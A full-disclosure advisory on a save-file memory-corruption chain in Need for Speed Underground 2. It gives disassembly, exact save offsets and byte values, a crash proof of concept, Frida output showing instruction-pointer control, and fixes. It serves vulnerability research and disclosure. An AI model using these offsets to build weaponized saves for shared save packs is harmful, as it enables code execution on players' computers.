# Full Disclosure: Remote Code Execution via Crafted Save File in Need for Speed Underground 2

## 1. Summary

The career save file loader in Need for Speed Underground 2 (`SPEED2.EXE`) contains three memory corruption vulnerabilities in the deserialization chain. Two of these chain together to achieve full instruction pointer (EIP) control from a crafted save file, resulting in arbitrary code execution when a victim loads the malicious save.

A crafted save file that triggers a crash on load is included in this repository. It requires a single 4-byte modification to a normal save file — no tools or instrumentation needed.

The binary has no ASLR (fixed image base `0x400000`), no stack cookies, no DEP, and no integrity check on save files. All addresses are deterministic across every installation.

**Attack scenario:** An attacker distributes a crafted career save file via a modding forum, Discord server, Reddit, or a "100% completion" save pack. The victim copies it into their profile directory and loads it through the in-game career menu. The deserialization code copies attacker-controlled bytes into a global struct, which are used as pointer operands and vtable entries without validation, yielding arbitrary code execution.

## 2. Target

| Property | Value |
|----------|-------|
| Binary | `SPEED2.EXE` |
| Platform | Windows x86, 32-bit PE |
| Image base | `0x00400000` (fixed, no ASLR) |
| Stack cookies | None |
| DEP | Not enforced (`/NXCOMPAT` not set) |
| Save file MAC | None — no hash, signature, or checksum verification |
| Binary SHA-256 | `8f6a9ae2c4cfa01181d2fd755d99c6f4b7103f60273908ea1de1e719dfe2a297` |
| Career singleton | Global at `0x0083a9d0`, inner struct at `0x0083a9e0` |

### Save File Format

The career save uses a "20CM" container format:

```
Offset  Size  Field
──────  ────  ─────────────────────────────────────────────────
0x00    4     Magic bytes "20CM" (0x4D433032)
0x04    4     Total file size (0xD6B6 = 54,966 bytes)
0x08    4     (unknown)
0x0C    4     Payload size (0xD692 = 54,930 bytes)
0x10    12    Hash field (read by the loader but NEVER VERIFIED)
0x1C    4     Version (must equal 0x10d to pass the gate check)
0x20    4     Payload size (repeated)
0x24    ...   Career payload — memcpy'd into the career struct
```

The loader validates three things:
1. Version field == `0x10d`
2. Payload size matches expected length
3. An error counter stays at zero

That's it. The 12-byte hash at offset `0x10` is read into a local but never compared against the payload. A crafted save that passes the version and size checks has its entire 54,930-byte payload copied directly into the career struct at `0x0083a9e0`.

### Deinterleaving

The raw payload goes through two deinterleave passes (`FUN_00516850`, `FUN_00529240`) before being copied into the career struct. This is a fixed byte-level permutation — not encryption, not a MAC, just data rearrangement. The permutation is deterministic and reversible, meaning every byte in the raw save maps to exactly one byte in the career struct.

Key mappings discovered through byte-pattern matching:

| Career struct offset | Save file offset | Field |
|---------------------|-----------------|-------|
| `+0x48` to `+0x7F` | `0xc51f` to `0xc557` | Audio settings (contiguous, 56 bytes) |
| `+0x70` | `0xc547` | Vuln 2 WHAT value (param_1) |
| `+0x84` to `+0xD3` | `0xc56b` to `0xc5bb` | Career state flags |
| `+0x8c` | `0xc573` | **Vuln 1 OOB array index** |

### Save File Location

```
%LOCALAPPDATA%\NFS Underground 2\<ProfileName>\<ProfileName>
```

No file extension. The profile name is both the directory name and the filename. Career saves are plain files with no OS-level protection — any process running as the user can read and write them.

## 3. Vulnerability Details

### 3.1 Vuln 1 — Out-of-Bounds Array Index (Save-Triggered Crash)

**Severity:** High
**Type:** CWE-787 (Out-of-bounds Write)
**Location:** `FUN_005344e0` at `0x5346d5`
**Trigger:** Save file only — no instrumentation needed

#### Disassembly (crash site)

```asm
5346b6  MOV   EDI, 0x83aa6c            ; EDI = career_inner + 0x8c
5346c0  PUSH  ESI                       ; loop counter
5346c1  CALL  0x00571ad0                ; lookup helper
5346c6  MOVZX EAX, AL
5346c9  PUSH  EAX
5346ca  LEA   EDX, [EBP - 0x24]         ; local_28 (9-DWORD stack buffer)
5346cd  PUSH  0x9
5346cf  PUSH  EDX
5346d0  CALL  0x00571fe0                ; fills local_28 with 9 values
5346d5  MOV   EAX, dword ptr [EDI]      ; EAX = *(career+0x8c) = SAVE DATA
5346d7  MOV   ECX, [EBP + EAX*4 - 0x24] ; ← CRASH: OOB array access
5346db  PUSH  ECX
5346dc  PUSH  ESI
5346dd  CALL  0x00571fc0                ; write sink
5346e5  ADD   EDI, 0x28                 ; next array element
5346e9  CMP   EDI, 0x83aabc            ; end of array
5346ef  JL    0x005346c0                ; loop
```

The instruction at `0x5346d5` loads a DWORD from the career struct (offset `+0x8c`, controlled by save data) into EAX. The instruction at `0x5346d7` uses this value as a scaled array index: `[EBP + EAX*4 - 0x24]`. The local buffer at `EBP - 0x24` holds 9 entries — any index outside `[0, 8]` reads out of bounds.

With `career+0x8c = 0x41414141`:
- `EAX * 4 = 0x05050504`
- `EBP + 0x05050504 - 0x24 = EBP + 0x050504E0`
- Access violation — the address is millions of bytes past the stack

#### Captured crash (from crafted save file, no Frida instrumentation)

```
Exception:    access-violation
Fault addr:   0x5346d7

Registers:
  EIP = 0x5346d7
  EAX = 0x41414141    ← SAVE FILE DATA (file offset 0xc573)
  EBX = 0x83aa28      ← career struct + 0x48
  ECX = 0x7fe700
  EDX = 0x0
  ESI = 0x0
  EDI = 0x83aa6c      ← career struct + 0x8c (index source)
  ESP = 0x1afc6c
  EBP = 0x1afcac
```

**Reproduction:** Copy `poc/crash_minimal.bin` to the save directory, load the profile. The game crashes during deserialization. The only difference from a clean save is 4 bytes at file offset `0xc573`.

#### Value sensitivity

Not all values at `career+0x8c` crash. The index is multiplied by 4 in 32-bit arithmetic, and the result is added to EBP. Values where `EAX * 4` wraps around to a small offset (like `0x7FFFFFFF * 4 = 0xFFFFFFFC`, landing near EBP) do not crash. Values that produce a large positive offset (like `0x41414141 * 4 = 0x05050504`) reliably crash because the target address is far outside mapped memory. Any index `>= 0x4001` produces a crash.

### 3.2 Vuln 2 — Arbitrary Write-What-Where

**Severity:** Critical
**Type:** CWE-123 (Write-what-where Condition)
**Location:** `FUN_004792b0`

#### Disassembly

```asm
004792b0  CMP   dword ptr [0x007faaa8], 0x0    ; gate check
004792b7  JZ    0x004792c3                      ; skip if gate closed
004792b9  MOV   EAX, dword ptr [ECX + 0x98]     ; EAX = WHERE pointer
004792bf  MOV   EDX, dword ptr [ESP + 0x4]       ; EDX = WHAT value (param_1)
004792c3  MOV   dword ptr [EAX + 0x14], EDX     ; *(WHERE + 0x14) = WHAT
004792c6  RET   0x4
```

This `thiscall` function writes `param_1` to `*(*(this + 0x98) + 0x14)`. ECX is a heap-allocated audio/music manager object whose fields are populated from save data during deserialization.

| Operand | Role | Source | Save-controlled? |
|---------|------|--------|------------------|
| `param_1` | WHAT value | `career+0x70` (save offset `0xc547`) | **Yes** |
| `*(ECX+0x98)` | WHERE pointer | Audio manager internal field | Indirect |

#### Confirmed save-file corruption

Setting `career+0x70 = 0xDEADBEEF` in the save file (4 bytes at offset `0xc547`) causes `FUN_004792b0` to write `0xDEADBEEF` into the audio manager's internal struct. Verified by Frida after loading the modified save with no other instrumentation:

```
career+0x70         = 0xDEADBEEF    (from save file)
*(audio_mgr+0x98)   = 0x0bc28f40    (audio sub-object)
*(0x0bc28f40+0x14)  = 0xDEADBEEF    ← save data written to heap object
```

The game does not crash because the corrupted field is not immediately dereferenced as a pointer. The corruption is silent but live.

### 3.3 Vuln 3 — Vtable Hijack (Arbitrary Code Execution)

**Severity:** Critical
**Type:** CWE-843 (Access of Resource Using Incompatible Type) → CWE-94 (Code Injection)
**Location:** `FUN_00469050`

#### Disassembly

```asm
0046906b  MOV   ECX, dword ptr [0x0082b974]     ; ECX = object ptr from global
00469071  TEST  ECX, ECX                          ; null check
00469073  JZ    0x0046907a                        ; skip if null
00469075  MOV   EAX, dword ptr [ECX]              ; EAX = *obj = vtable ptr
00469077  CALL  dword ptr [EAX + 0x14]            ; CALL vtable[5]
```

Standard C++ virtual function call with three levels of indirection. If Vuln 2 overwrites `DAT_0082b974` with a pointer to attacker-controlled memory inside the career struct, the entire dereference chain follows attacker-chosen values.

## 4. Exploit Chain: Vuln 2 → Vuln 3

### Step 1: Save payload lands in memory

The loader copies 54,930 bytes from the save file into the career struct at `0x0083a9e0`. We place a fake C++ object at career_inner + 0x300 (`0x0083ace0`):

```
Address     Value         Purpose
─────────   ───────────   ─────────────────────────────────
0x0083ace0  0x0083ace0    vtable pointer (self-referencing)
0x0083acf4  0x41414141    vtable[5] — target EIP
```

### Step 2: Vuln 2 redirects the global pointer

During deserialization, `FUN_004792b0` fires. We set:
- `*(ECX+0x98)` → `0x0082b960` (so the write hits `0x0082b960 + 0x14 = 0x0082b974`)
- `param_1` → `0x0083ace0` (the address of our fake object)

After Vuln 2 executes: `DAT_0082b974 = 0x0083ace0`

### Step 3: Vuln 3 follows the hijacked pointer

```
MOV ECX, [0x0082b974]     → ECX = 0x0083ace0 (our fake object)
MOV EAX, [ECX]            → EAX = 0x0083ace0 (self-referencing vtable)
CALL [EAX + 0x14]         → CALL *0x0083acf4 → CALL 0x41414141
```

**EIP = 0x41414141.** Full control.

## 5. Proof of Concept

### 5.1 Save-triggered crash (no instrumentation)

The file `poc/crash_minimal.bin` is a career save with a single 4-byte modification:

```
Offset   Clean value   Exploit value   Career field
──────   ───────────   ─────────────   ────────────────────
0xc573   00 00 00 00   41 41 41 41     career+0x8c (array index)
```

Copy it to `%LOCALAPPDATA%\NFS Underground 2\<Profile>\<Profile>` and load the profile. The game crashes at `0x5346d7` with `EAX = 0x41414141`.

### 5.2 Silent memory corruption (no instrumentation)

Modifying save file offset `0xc547` to `EF BE AD DE` sets `career+0x70 = 0xDEADBEEF`. Loading this save plants `0xDEADBEEF` into the audio manager's internal heap object via the Vuln 2 write-what-where mechanism. No crash, no visible error — the corruption is silent. Verified by attaching Frida after load and reading the target address.

### 5.3 Full EIP control (Frida instrumentation)

The script `poc/eip_control.js` demonstrates the Vuln 2 → Vuln 3 chain:

```
[1] FUN_005344e0 (deser_inner) entered — chain ARMED
[2] FUN_004792b0 (Vuln 2) ENTERED
      ECX (this)           = 0x0be41f80   (audio manager object)
      *(ECX+0x98)          = 0x0be41f40   → original target 0x0be41f54
      PATCHED *(ECX+0x98)  = 0x0082b960   → write targets DAT_0082b974
      original param_1     = 0x1
      PATCHED param_1      = 0x0083ace0   (fake object in career struct)
[3] After Vuln 2 return:
      DAT_0082b974         = 0x0083ace0   ✓ overwritten by mechanism
[4] FUN_00469050 (Vuln 3) ENTERED
      DAT_0082b974         = 0x0083ace0   ← FAKE VTABLE
      CALL target          = 0x41414141   ← ARMED
[5] EXCEPTION: access-violation
      EIP = 0x41414141 — INSTRUCTION POINTER CONTROLLED
```

### 5.4 Vtable pointers in save data

The career struct contains an array of C++ objects at offsets `+0x3b0` through `+0x700+` with vtable pointers to `0x79aae4` (confirmed as a real vtable — all entries are valid code addresses). These objects repeat at 0x1C-byte intervals. The deinterleaving scatters their bytes non-contiguously in the raw save file, making surgical modification complex. However, filling the entire payload with a single byte value (as in our full-payload test) overwrites these vtable pointers, causing crashes when the game dispatches virtual calls on them.

## 6. Affected Components

| Function | Address | Role | Vulnerable? |
|----------|---------|------|-------------|
| `FUN_005344e0` | `0x5344e0` | Inner deserializer (loop + dispatch) | **Vuln 1** — OOB index, **calls Vuln 2 & 3** |
| `FUN_004792b0` | `0x4792b0` | Field store with pointer deref | **Vuln 2** — Write-what-where |
| `FUN_00469050` | `0x469050` | Virtual dispatch after deser | **Vuln 3** — Vtable hijack |
| `FUN_00571fc0` | `0x571fc0` | Global table write | Sink for Vuln 1 |
| `FUN_00516850` | `0x516850` | Deinterleave pass 1 | Safe (fixed permutation) |
| `FUN_00529240` | `0x529240` | Deinterleave pass 2 | Safe (fixed permutation) |

## 7. Impact Assessment

| Factor | Assessment |
|--------|------------|
| Confidentiality | **High** — arbitrary code execution allows reading any process/system data |
| Integrity | **High** — arbitrary code execution allows modifying any data |
| Availability | **High** — guaranteed crash; persistent if save auto-loads on startup |
| Attack complexity | **Low** — all addresses are deterministic, no mitigations to bypass |
| Privileges required | **None** — save files are user-writable and freely shareable |
| User interaction | **Required** — victim must load the crafted save file |

Career save files are commonly shared in gaming communities. Modding forums, Discord servers, Reddit, and "100% completion save" download sites are all established distribution channels. The save format has zero cryptographic protection and the game performs no integrity verification.

## 8. Recommendations

1. **Save file integrity:** Implement HMAC-SHA256 or equivalent MAC over the career payload. Reject saves that fail verification before any data is copied into memory.

2. **Pointer and index validation:** Bounds-check every index and pointer value read from the save file before using it as a memory operand. The array index in Vuln 1 should be clamped to `[0, 8]`. The pointer in Vuln 2 should be validated against known object boundaries.

3. **Modern compiler mitigations:** Recompile with `/NXCOMPAT` (DEP), `/DYNAMICBASE` (ASLR), and `/GS` (stack cookies). These would not eliminate the bugs but would make exploitation significantly harder.

4. **Vtable pointer validation:** Before dereferencing `DAT_0082b974`, verify that it points to a known valid object instance, not arbitrary memory.

5. **Separate sensitive and untrusted data:** Don't copy an entire save file payload into a struct that contains fields used as pointer operands. Parse and validate individual fields.

## 9. Timeline

| Date | Event |
|------|-------|
| 2026-11-06 | Static analysis of SPEED2.EXE began (Ghidra 12.1.4 via REA) |
| 2026-11-07 | Save file format reverse-engineered; deserialization functions identified |
| 2026-11-08 | Three vulnerabilities identified; all runtime gates verified open via Frida |
| 2026-11-08 | Exploit chain designed (Vuln 2 → Vuln 3) |
| 2026-11-09 | EIP control proven dynamically (EIP = 0x41414141) |
| 2026-11-09 | Save file byte mapping discovered; save-triggered crash confirmed |
| 2026-11-09 | Minimal 4-byte exploit save file created and tested |
| 2026-11-09 | Silent memory corruption via save file confirmed (DEADBEEF in audio manager) |
| 2026-11-09 | Full disclosure published |

## 10. Tools

- **Ghidra 12.1.4** (via [REA](https://re-anytime.com/)) — static analysis, decompilation, cross-reference analysis
- **Frida** (via REA) — dynamic instrumentation, runtime gate verification, EIP control proof

## 11. Author

Independent security research. This analysis was conducted on a legally purchased copy of the game for educational purposes.

## 12. Disclosure Rationale

Full disclosure was chosen because:

- The game is 22 years old (released November 2004)
- EA has not shipped a patch for this title in approximately two decades
- There is no active security team or bug bounty program covering this product
- No realistic expectation of a vendor fix exists
- The findings are educational and demonstrate common vulnerability patterns in legacy game engines
- No weaponized exploit is included — the PoC proves control of EIP and nothing more
